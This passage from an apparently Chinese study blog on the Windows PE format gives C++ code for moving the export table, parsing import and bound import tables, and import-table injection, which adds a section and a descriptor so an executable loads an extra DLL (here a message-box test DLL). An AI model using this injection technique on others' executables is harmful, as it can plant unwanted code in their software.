class="hljs-string">&quot;导出表函数名字表文件地址:%x\n&quot;</span>, <span class="hljs-built_in">RVAtoFOA</span>((DWORD)*tureAddressOfNames, pFileBuffer));<br><br>PCHAR Nameaddr = (PCHAR)((BYTE*)<span class="hljs-built_in">RVAtoFOA</span>((DWORD)*tureAddressOfNames, pFileBuffer) + (DWORD)pFileBuffer);<br><span class="hljs-comment">//CHAR Name[] = &#123; *Nameaddr &#125;;</span><br><span class="hljs-built_in">memcpy</span>(start, Nameaddr, <span class="hljs-built_in">strlen</span>(Nameaddr));<br><br><br><span class="hljs-comment">//修复AddressOfNames</span><br>DWORD namestartyz = (DWORD)start - (DWORD)pFileBuffer;<br><span class="hljs-comment">//计算nameaddr的rva</span><br>DWORD addrofnamerva = (DWORD)pLaswSectionHeaderBase-&gt;VirtualAddress + (DWORD)start - (DWORD)starttest;<br>*tureAddressOfNames2 = addrofnamerva;<br>start = (LPVOID)((DWORD)start + <span class="hljs-built_in">strlen</span>(Nameaddr));<br><br><br><span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>)<br>&#123;<br>addrofnamervafirst = addrofnamerva;<br>&#125;<br><span class="hljs-built_in">memset</span>(start, <span class="hljs-number">0x00</span>, <span class="hljs-number">1</span>);<span class="hljs-comment">//字符串结尾加\00</span><br>start = (LPVOID)((DWORD)start + <span class="hljs-number">1</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;导出表函数大小%x的%x名字:%s,验证修改后的foa正确性%x,对比现在的foa：%x\n&quot;</span>, <span class="hljs-built_in">strlen</span>(Nameaddr),i, Nameaddr,<span class="hljs-built_in">RVAtoFOA</span>(*tureAddressOfNames2,pFileBuffer), namestartyz);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;******************************\n&quot;</span>);<br><br><span class="hljs-comment">//复制IMAGE_EXPORT_DIRECTORY结构</span><br>PIMAGE_EXPORT_DIRECTORY exportDIRECTORYfilebuffercopy = (PIMAGE_EXPORT_DIRECTORY) start;<br><span class="hljs-built_in">memcpy</span>(start, (LPVOID)exportDIRECTORYfilebuffer, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(IMAGE_EXPORT_DIRECTORY));<br>start = (LPVOID)((DWORD)start + <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(IMAGE_EXPORT_DIRECTORY));<br><br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">第七步：修复IMAGE_EXPORT_DIRECTORY结构中的</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">AddressOfFunctions</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">AddressOfNameOrdinals</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">AddressOfNames</span><br><span class="hljs-comment">*/</span><br>exportDIRECTORYfilebuffercopy-&gt;AddressOfFunctions = AddressOfFunctionsrva;<br>exportDIRECTORYfilebuffercopy-&gt;AddressOfNameOrdinals = AddressOfNameOrdinalsrva;<br><br>exportDIRECTORYfilebuffercopy-&gt;AddressOfNames = AddressOfNamesrva;<br><span class="hljs-comment">//exportDIRECTORYfilebuffercopy-&gt;Name = addrofnamervafirst;</span><br><br><br><span class="hljs-comment">//改数据目录的表指向</span><br>pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">0</span>].VirtualAddress = (DWORD)pLaswSectionHeaderBase-&gt;VirtualAddress+(DWORD)exportDIRECTORYfilebuffercopy -(DWORD)starttest;<br><br><span class="hljs-keyword">return</span> pFileBuffer;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>效果</p><img src="/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/image-20220313203816403.png" alt="image-20220313203816403" style="zoom:67%;"><p>这个移动后是可以正常调用的</p><h1 id="导入表和iat表"><a class="markdownIt-Anchor" href="#导入表和iat表"></a> 导入表和IAT表</h1><p>导入表结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        DWORD   Characteristics;           <br>        DWORD   OriginalFirstThunk;    <span class="hljs-comment">//指向IMAGE_THUNK_DATA32结构的起始位置    INT表 </span><br>    &#125;;<br>    DWORD   TimeDateStamp;        <span class="hljs-comment">//这个值为0说明可执行文件不与输入的dll绑定（绑定后IAT表的值是函数地址） </span><br>    DWORD   ForwarderChain;         <br>    DWORD   Name;<br>    DWORD   FirstThunk;           <span class="hljs-comment">//指向IMAGE_THUNK_DATA32结构    IAT表  </span><br>&#125; IMAGE_IMPORT_DESCRIPTOR;<br><span class="hljs-keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;<br>`<br></code></pre></td></tr></table></figure><p><strong>OriginalFirstThunk，FirstThunk是指向第一个IMAGE_THUNK_DATA32的rva，遍历到0算此dll结束</strong></p><p>MAGE_THUNK_DATA32结构，4字节，看成一个dword就行</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_THUNK_DATA32</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><span class="hljs-comment">//联合类型，高位是1则说明去除高位后记录的是函数序号，不是则是指向IMAGE_IMPORT_BY_NAME的rva</span><br>        PBYTE  ForwarderString;<br>        PDWORD Function;<br>        DWORD Ordinal;<span class="hljs-comment">//序号</span><br>        PIMAGE_IMPORT_BY_NAME  AddressOfData;<span class="hljs-comment">//指向IMAGE_IMPORT_BY_NAME</span><br>    &#125; u1;<br>&#125; IMAGE_THUNK_DATA32;<br><span class="hljs-keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;<br><br></code></pre></td></tr></table></figure><p>IMAGE_IMPORT_BY_NAME结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_BY_NAME</span> &#123;</span><br>    WORD    Hint;<span class="hljs-comment">//可能为空，编译器决定 如果不为空 是函数在导出表中的索引</span><br>    BYTE    Name[<span class="hljs-number">1</span>];<span class="hljs-comment">//函数名称的首位，以\0结尾</span><br>&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;<br><br><br></code></pre></td></tr></table></figure><h2 id="程序解析"><a class="markdownIt-Anchor" href="#程序解析"></a> 程序解析</h2><p>流程-通过可选头的数据目录的第二个[1]找到其数据目录数据-&gt;找到Virtualaddressrva（转换foa）-&gt;找到导入表起始地址-&gt;遍历导入表-&gt;主要遍历导入表的Name，OriginalFirstThunk，FirstThunk，遍历OriginalFirstThunk，FirstThunk时，先转foa，这个foa指向的位置是_IMAGE_THUNK_DATA32结构，看成DWORD即可-&gt;判断高位，为0则是指向IMAGE_IMPORT_BY_NAME结构的rva，需要转foa</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">showDESCRIPTOR</span><span class="hljs-params">(LPVOID pFileBuffer)</span></span><br><span class="hljs-function"></span>&#123;<br>PIMAGE_IMPORT_DESCRIPTOR pDescriptor = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS pNtHeaders = <span class="hljs-literal">NULL</span>;<br>PIMAGE_IMPORT_BY_NAME pImportbyname = <span class="hljs-literal">NULL</span>;<br>PIMAGE_IMPORT_DESCRIPTOR pDescriptorture = <span class="hljs-literal">NULL</span>;<br>PIMAGE_IMPORT_BY_NAME namefuction = <span class="hljs-literal">NULL</span>;<br><br><br><br><br>pNtHeaders = <span class="hljs-built_in">FileToNtHeader</span>(pFileBuffer);<br><span class="hljs-comment">//定位导入表</span><br>pDescriptor = (PIMAGE_IMPORT_DESCRIPTOR) pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">1</span>].VirtualAddress;<br><span class="hljs-comment">//此时在内存中的地址要加pFileBuffer</span><br>pDescriptorture = <span class="hljs-built_in">PIMAGE_IMPORT_DESCRIPTOR</span> (<span class="hljs-built_in">RVAtoFOA</span>((DWORD)pDescriptor,pFileBuffer)+(DWORD)pFileBuffer);<br><br><span class="hljs-comment">//遍历导入表</span><br><span class="hljs-keyword">while</span> (*((DWORD*)pDescriptorture) != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;******************************\n&quot;</span>);<br><span class="hljs-comment">//输出dll名字</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dll名字为%s\n&quot;</span>, (<span class="hljs-built_in">RVAtoFOA</span>(pDescriptorture-&gt;Name, pFileBuffer) + (DWORD)pFileBuffer));<br><br><span class="hljs-comment">//遍历OriginalFirstThunk</span><br>DWORD* startThunk =(DWORD*) (<span class="hljs-built_in">RVAtoFOA</span>((DWORD)pDescriptorture-&gt;OriginalFirstThunk, pFileBuffer) + (DWORD)pFileBuffer);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OriginalFirstThunk内容：\n&quot;</span>);<br><span class="hljs-keyword">while</span> (*startThunk != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">if</span> ((* startThunk &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0</span>)<br><br>&#123;<br>namefuction = (PIMAGE_IMPORT_BY_NAME)(<span class="hljs-built_in">RVAtoFOA</span>(*startThunk, pFileBuffer)+(DWORD)pFileBuffer);<br>PCHAR Namefu = (PCHAR)namefuction-&gt;Name;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IMAGE_IMPORT_BY_NAME地址%x,函数名字：%s\n&quot;</span>, *startThunk,Namefu);<br><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;函数的序号%x\n&quot;</span>, *startThunk &amp; <span class="hljs-number">0x7FFFFFFF</span>);<br>&#125;<br><br><br><span class="hljs-comment">//startThunk = 0;</span><br>startThunk = startThunk + <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">//遍历FirstThunk</span><br><br>DWORD* startFirstThunk = (DWORD*)(<span class="hljs-built_in">RVAtoFOA</span>((DWORD)pDescriptorture-&gt;FirstThunk, pFileBuffer) + (DWORD)pFileBuffer);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;FirstThunk内容：\n&quot;</span>);<br><span class="hljs-keyword">while</span> (*startFirstThunk != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">if</span> ((*startFirstThunk &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0</span>)<br><br>&#123;<br>namefuction = (PIMAGE_IMPORT_BY_NAME)(<span class="hljs-built_in">RVAtoFOA</span>(*startFirstThunk, pFileBuffer) + (DWORD)pFileBuffer);<br>PCHAR Namefu = (PCHAR)namefuction-&gt;Name;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IMAGE_IMPORT_BY_NAME地址%x,函数名字：%s\n&quot;</span>, *startFirstThunk, Namefu);<br><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;函数的序号%x\n&quot;</span>, *startFirstThunk &amp; <span class="hljs-number">0x7FFFFFFF</span>);<br>&#125;<br><br><br><span class="hljs-comment">//startThunk = 0;</span><br>startFirstThunk = startFirstThunk + <span class="hljs-number">1</span>;<br>&#125;<br>pDescriptorture = pDescriptorture + <span class="hljs-number">1</span>;<br>&#125;<br><br><br><br>&#125;<br></code></pre></td></tr></table></figure><img src="/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/image-20220317171257695.png" alt="image-20220317171257695" style="zoom:67%;"><h1 id="绑定导入表"><a class="markdownIt-Anchor" href="#绑定导入表"></a> 绑定导入表</h1><p>PE加载EXE相关的DLL时，首先会根据<strong>IMAGE_IMPORT_DESCRIPTOR结构</strong>中的TimeDateStamp来判断是否要重新<br>计算IAT表中的地址。<br>TimeDateStamp == 0  未绑定<br>TimeDateStamp == -1 已绑定 真正的绑定时间为IMAGE_BOUND_IMPORT_DESCRIPTOR的TimeDateStamp</p><p>绑定导入表内的时间戳用于判断dll是否已经更新，如果时间戳和dll的不一样，则重新计算IAT表</p><p>结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_BOUND_IMPORT_DESCRIPTOR</span> &#123;</span><br>    DWORD   TimeDateStamp;<br>    WORD    OffsetModuleName;<span class="hljs-comment">//第一个DESCRIPTOR的值+OffsetModuleName</span><br>    WORD    NumberOfModuleForwarderRefs;<br><span class="hljs-comment">// Array of zero or more IMAGE_BOUND_FORWARDER_REF follows</span><br>&#125; IMAGE_BOUND_IMPORT_DESCRIPTOR,  *PIMAGE_BOUND_IMPORT_DESCRIPTOR;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_BOUND_FORWARDER_REF</span> &#123;</span><br>    DWORD   TimeDateStamp;<br>    WORD    OffsetModuleName;<br>    WORD    Reserved;<br>&#125; IMAGE_BOUND_FORWARDER_REF, *PIMAGE_BOUND_FORWARDER_REF;<br><br><br></code></pre></td></tr></table></figure><p>代码编写</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">showBOUND_IMPORT_DESCRIPTOR</span><span class="hljs-params">(LPVOID pFileBuffer)</span></span><br><span class="hljs-function"></span>&#123;<br>PIMAGE_NT_HEADERS pNtHeaders = <span class="hljs-literal">NULL</span>;<br>PIMAGE_BOUND_IMPORT_DESCRIPTOR pDESCRIPTOR = <span class="hljs-literal">NULL</span>;<br>PIMAGE_BOUND_FORWARDER_REF pFORWARDER_REF = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;******************************\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;********绑定导入表解析********\n&quot;</span>);<br>pNtHeaders = <span class="hljs-built_in">FileToNtHeader</span>(pFileBuffer);<br><span class="hljs-keyword">if</span> (pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">11</span>].VirtualAddress == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br>pDESCRIPTOR = (PIMAGE_BOUND_IMPORT_DESCRIPTOR)(<span class="hljs-built_in">RVAtoFOA</span>(pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">11</span>].VirtualAddress, pFileBuffer)+(DWORD)pFileBuffer);<br>DWORD startoffer = (DWORD)pDESCRIPTOR;<br>PCHAR name = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">while</span> (*(DWORD*)pDESCRIPTOR != <span class="hljs-number">0</span>)<br>&#123;<br><br>name = (PCHAR)startoffer + pDESCRIPTOR-&gt;OffsetModuleName;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;时间戳%x名字%s,NumberOfModule数量%x\n&quot;</span>, pDESCRIPTOR-&gt;TimeDateStamp,name,pDESCRIPTOR-&gt;NumberOfModuleForwarderRefs);<br><span class="hljs-keyword">if</span> (pDESCRIPTOR-&gt;NumberOfModuleForwarderRefs != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;存在NumberOfModuleForwarderRefs结构：\n&quot;</span>);<br>pDESCRIPTOR = pDESCRIPTOR + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i= <span class="hljs-number">0</span>; i &lt; pDESCRIPTOR-&gt;NumberOfModuleForwarderRefs; i++)<br>&#123;<br><br>PIMAGE_BOUND_FORWARDER_REF pFORWARDER_REF = (PIMAGE_BOUND_FORWARDER_REF)pDESCRIPTOR;<br>name = (PCHAR)startoffer + pFORWARDER_REF-&gt;OffsetModuleName;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;时间戳%x名字%s\n&quot;</span>, pFORWARDER_REF-&gt;TimeDateStamp, name);<br>pDESCRIPTOR = pDESCRIPTOR + <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NumberOfModuleForwarderRefs结构结束\n&quot;</span>);<br><br>&#125;<br>pDESCRIPTOR = pDESCRIPTOR + <span class="hljs-number">1</span>;<br>&#125;<br><br><br><br><br>&#125;<br></code></pre></td></tr></table></figure><img src="/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/image-20220316200303598.png" alt="image-20220316200303598" style="zoom:67%;"><h2 id="导入表注入"><a class="markdownIt-Anchor" href="#导入表注入"></a> 导入表注入</h2><p>dll的main方法是添加和去除时调用，使用一个在加载和退出时调用的messagebox函数的dll验证注入是否成功</p><p>此处使用的dll名字InjectDll.dll，函数名字：ExportFunction，git目录中有这个dll</p><p><strong>注意修改int表，iat表，导入表的结尾，要多一个这个结构，并且全是0，特别是导入表，注意大小是0x14h</strong></p><p>步骤：</p><p>1.新加一个节(可以找节的空白处添加，注意计算添加数据大小，这里我直接添加新节了)</p><p>2.把所有导入表copy到这个节数据端，**（这里有坑，如果按照OptionalHeader.DataDirectory[1].Size的大小复制导入表，因为这个大小其实是最后一个导入表+0x14个00的大小，所以复制的位置应该是size-0x14的位置，复制完后再填充一个0x14的00）**然后新加一个导入表结构，</p><p>3.新加IAT,INT表结构，因为这里函数名只有一个，所以这两个结构都要加8字节就行（最后4个字节是00），<strong>记得赋值给OriginalFirstThunk和FirstThunk</strong></p><p>4.新加IMAGE_IMPORT_BY_NAME结构，函数名字拷贝到IMAGE_IMPORT_BY_NAME-&gt;Name，这个结构的起始地址赋值给IAT,INT表。</p><p>5.复制dll名字，起始地址**（rva）**赋值给新加的导入表-&gt;Name。</p><p>6.修正修正IMAGE_DATA_DIRECTORY结构的<strong>VirtualAddress</strong>和<strong>Size</strong></p><p>程序实现，虽然好像写的很拉，调了2小时，最后还是成功了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">LPVOID <span class="hljs-title">injectDESCRIPTOR</span><span class="hljs-params">(LPVOID pFileBuffer)</span></span><br><span class="hljs-function"></span>&#123;<br>PIMAGE_IMPORT_DESCRIPTOR pDescriptor = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS pNtHeaders = <span class="hljs-literal">NULL</span>;<br>PIMAGE_IMPORT_BY_NAME pImportbyname = <span class="hljs-literal">NULL</span>;<br>PIMAGE_IMPORT_DESCRIPTOR pDescriptorture = <span class="hljs-literal">NULL</span>;<br>PIMAGE_IMPORT_BY_NAME namefuction = <span class="hljs-literal">NULL</span>;<br><br><br><br><br>pNtHeaders = <span class="hljs-built_in">FileToNtHeader</span>(pFileBuffer);<br><br><br><span class="hljs-comment">//第一步</span><br><span class="hljs-comment">//根据目录项得到导入表的信息，得到Size:导入表的总大小</span><br>pNtHeaders = <span class="hljs-built_in">FileToNtHeader</span>(pFileBuffer);<br>DWORD sizeofDescriper = pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">1</span>].Size;<br><span class="hljs-comment">//定位导入表</span><br>pDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">1</span>].VirtualAddress;<br><span class="hljs-comment">//此时在内存中的地址要加pFileBuffer</span><br>pDescriptorture = <span class="hljs-built_in">PIMAGE_IMPORT_DESCRIPTOR</span>(<span class="hljs-built_in">RVAtoFOA</span>((DWORD)pDescriptor, pFileBuffer) + (DWORD)pFileBuffer);<br><span class="hljs-comment">//得到OriginalFirstThunk，FirstThunk的地址</span><br><span class="hljs-comment">//OriginalFirstThunk</span><br><span class="hljs-comment">//DWORD* startThunk = (DWORD*)(RVAtoFOA((DWORD)pDescriptorture-&gt;OriginalFirstThunk, pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="hljs-comment">//FirstThunk</span><br><span class="hljs-comment">//DWORD* startFirstThunk = (DWORD*)(RVAtoFOA((DWORD)pDescriptorture-&gt;FirstThunk, pFileBuffer) + (DWORD)pFileBuffer);</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">*/</span><br>PIMAGE_SECTION_HEADER pSectionHeaderBase = <span class="hljs-literal">NULL</span>;<br>LPVOID start = <span class="hljs-literal">NULL</span>;<br>PIMAGE_EXPORT_DIRECTORY exportDIRECTORY = <span class="hljs-literal">NULL</span>;<br>pNtHeaders = <span class="hljs-built_in">FileToNtHeader</span>(pFileBuffer);<br>pSectionHeaderBase = <span class="hljs-built_in">LocateSectionBase</span>(pFileBuffer);<br><span class="hljs-comment">//找最后一个节</span><br><span class="hljs-comment">//这里直接新创建一个节了就不判断大小了（用之前的函数创建完传入filebufer）</span><br><br>PIMAGE_SECTION_HEADER pLaswSectionHeaderBase = <span class="hljs-built_in">PIMAGE_SECTION_HEADER</span>((BYTE*)pSectionHeaderBase + (DWORD)(<span class="hljs-number">0x28</span> * (pNtHeaders-&gt;FileHeader.NumberOfSections - <span class="hljs-number">1</span>)));<br><span class="hljs-comment">//找最后一个节的开始地址</span><br>start = (LPVOID)(pLaswSectionHeaderBase-&gt;PointerToRawData + (DWORD)pFileBuffer);<br>LPVOID starttest = (LPVOID)(pLaswSectionHeaderBase-&gt;PointerToRawData + (DWORD)pFileBuffer);<span class="hljs-comment">//记录内存空间中复制开始的地址</span><br><br><span class="hljs-comment">//导入表copy到空白区</span><br><span class="hljs-built_in">memcpy</span>(start, pDescriptorture, sizeofDescriper);<br>start = (LPVOID)((DWORD)start + sizeofDescriper);<span class="hljs-comment">//这个是最后一个导入表+1个空的导入表的位置</span><br>start = (LPVOID)((DWORD)start - <span class="hljs-number">0x14</span>);<br><br><span class="hljs-comment">//追加一个导入表</span><br>PIMAGE_IMPORT_DESCRIPTOR pNewdescripitor = (PIMAGE_IMPORT_DESCRIPTOR)start;<br><span class="hljs-built_in">memcpy</span>(start,starttest,<span class="hljs-number">0x14</span>);<br>start = (LPVOID)((DWORD)start + <span class="hljs-number">2</span>*<span class="hljs-number">0x14</span>);<br><span class="hljs-comment">//start = (DWORD*)start + 1;</span><br><br><br><span class="hljs-comment">//追加8个字节的INT表和IAT表</span><br>DWORD* startINT = (DWORD*)start;<br>pNewdescripitor-&gt;OriginalFirstThunk = (DWORD)pLaswSectionHeaderBase-&gt;VirtualAddress + (DWORD)start - (DWORD)starttest;<br>start = startINT + <span class="hljs-number">2</span>;<br><span class="hljs-comment">//追加8字节的IAT表</span><br>DWORD* startIAT = (DWORD*)start;<br>pNewdescripitor-&gt;FirstThunk = (DWORD)pLaswSectionHeaderBase-&gt;VirtualAddress + (DWORD)start - (DWORD)starttest;<br>start = startIAT + <span class="hljs-number">2</span>;<br><br><span class="hljs-comment">//追加IMAGE_IMPORT_BY_NAME，因为本来创建节就为0，所以跳过前2个字节存储函数名字</span><br>PIMAGE_IMPORT_BY_NAME Importbyname = (PIMAGE_IMPORT_BY_NAME)start;<br>DWORD ImportbynameRva = (DWORD)pLaswSectionHeaderBase-&gt;VirtualAddress + (DWORD)start - (DWORD)starttest;<br><span 